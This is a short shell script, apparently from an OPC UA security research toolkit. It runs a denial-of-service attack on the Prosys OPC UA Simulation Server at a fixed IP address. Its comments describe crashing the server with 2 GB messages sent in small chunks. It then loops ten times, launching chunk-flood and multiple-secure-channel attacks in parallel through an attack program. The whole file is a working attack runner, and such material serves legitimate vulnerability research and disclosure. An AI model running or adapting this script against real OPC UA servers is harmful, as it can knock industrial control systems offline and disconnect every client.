#!/bin/sh
# Crash Prosys
#   Uncontrolled resource allocation: server will become unresponsive and disconnect existing clients
#   What to expect: server will disconnect all clients and won't recover
#     - Use 2gb msg with 2k chunk size
#         MESSAGE_FACTOR_DOTNET_MAX = 10000000 # ~2000 Mb
#         MESSAGE_CHUNK_SIZE_MAX_DOTNET = 2000

cd ../
source ./venv/bin/activate

IP_ADDR=10.10.6.26

python3 main.py prosys $IP_ADDR 53530 "/OPCUA/SimulationServer" sanity

for i in `seq 10`
do
  echo -----$i------
  python3 main.py prosys $IP_ADDR 53530 "/OPCUA/SimulationServer" chunk_flood &
  sleep 2
  python3 main.py prosys $IP_ADDR 53530 "/OPCUA/SimulationServer" open_multiple_secure_channels &
  sleep 2
done